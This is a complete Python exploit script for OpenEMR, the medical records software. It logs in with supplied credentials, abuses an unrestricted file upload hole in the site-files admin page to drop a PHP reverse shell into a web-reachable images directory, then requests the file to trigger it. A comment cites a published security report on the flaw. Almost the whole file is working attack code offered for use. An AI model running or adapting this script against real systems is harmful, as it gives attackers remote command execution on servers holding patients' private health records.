#!/usr/bin/env python3

import requests
import argparse


parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="Target host", required=True)
parser.add_argument("-u", "--user", help="OpenEMR Username", required=True)
parser.add_argument("-p", "--password", help="OpenEMR password", required=True)
parser.add_argument("-r", "--reverse_shell", help="Select PHP reverse shell to upload", required=True)

opt = parser.parse_args()

# https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf
# 
# 5.0 - Unrestricted File UploadOpen EMR is vulnerable to an unrestricted file upload vulnerability in super/manage_site_files.php.
# This is due to improper (non-existent), checks on the filesubmitted by the administrator. An authenticated user could use this vulnerability 
# to escalate their privileges by uploaded a PHP web shell to execute system commands.


upload_page = "/interface/super/manage_site_files.php"
login_page = "/interface/main/main_screen.php?auth=login&site=default" 


with requests.session() as s:
    login = {
                "new_login_session_management": "1",
                "authProvider": "Default",
                "authUser": opt.user,
                "clearPass": opt.password,
                "languageChoice": "1"
            }

    print("[*] Authenticating with user: {} to {}{}".format(opt.user, opt.target, login_page))
    
    req = s.post("{}{}".format(opt.target, login_page), data=login)
    if "login_screen.php?error=1site=" in req.text:
        print("Login failure")
        exit()
    
      
    # Path where the reverse shell will be uploaded
    drop_path = "/sites/default/images/"
    
    shell = open(opt.reverse_shell, 'rb')
    files = {'form_image': shell}
    
    # Body of request
    data = {
              'form_filename': '', 
              'form_filedata': '', 
              'MAX_FILE_SIZE': '12000000', 
              'form_dest_filename': '', 
              'form_education': '', 
              'bn_save': 'Save'
           } 
    
    print("[*] Uploaded {} to {}{} in directory: {}".format(shell.name, opt.target, upload_page, drop_path))
    s.post("{}{}".format(opt.target, upload_page), files=files, data=data)

    print("[*] Contacting reverse shell page at: {}{}".format(drop_path, shell.name.split("/")[-1]))
    s.get("{}{}{}".format(opt.target, drop_path, shell.name.split("/")[-1]))
